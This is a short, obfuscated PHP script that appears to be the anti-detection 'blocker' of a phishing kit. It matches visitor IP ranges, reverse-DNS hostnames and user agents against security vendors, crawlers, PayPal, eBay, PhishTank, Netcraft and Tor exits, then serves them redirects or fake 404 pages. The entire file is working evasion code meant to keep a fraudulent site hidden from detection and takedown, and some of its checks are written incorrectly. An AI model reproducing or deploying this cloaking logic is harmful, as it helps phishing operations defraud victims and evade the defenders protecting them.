<?php

$c28dd9c = $_SERVER['REMOTE_ADDR'];
$c97e57ec = array("^66.102.*.*","^38.100.*.*","^107.170.*.*",);
if (in_array($c28dd9c, $c97e57ec)) {
    exit(header('Location: error.php'));
} else {
    foreach ($c97e57ec as $a4ade) {
        if (preg_match('/'.$a4ade.'/', $c28dd9c)) {
            header('Location: http://m3.ma');
            echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}$e5bd3f5f = gethostbyaddr($c28dd9c);
$f6650d6e = array("drweb","hostinger","scanurl","above","google","Dr.Web","facebook","softlayer","amazonaws","cyveillance","dreamhost","netpilot","calyxinstitute","tor-exit","phishtank","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler");
foreach ($f6650d6e as $e540ca) {
    if (substr_count($e5bd3f5f, $e540ca) > 0) {
        header('error.php');
        echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $c3d1b = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler");
    foreach ($c3d1b as $cef6a) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $cef6a) !== false) {
            exit(header('Location: error.php'));
        }
    }
}
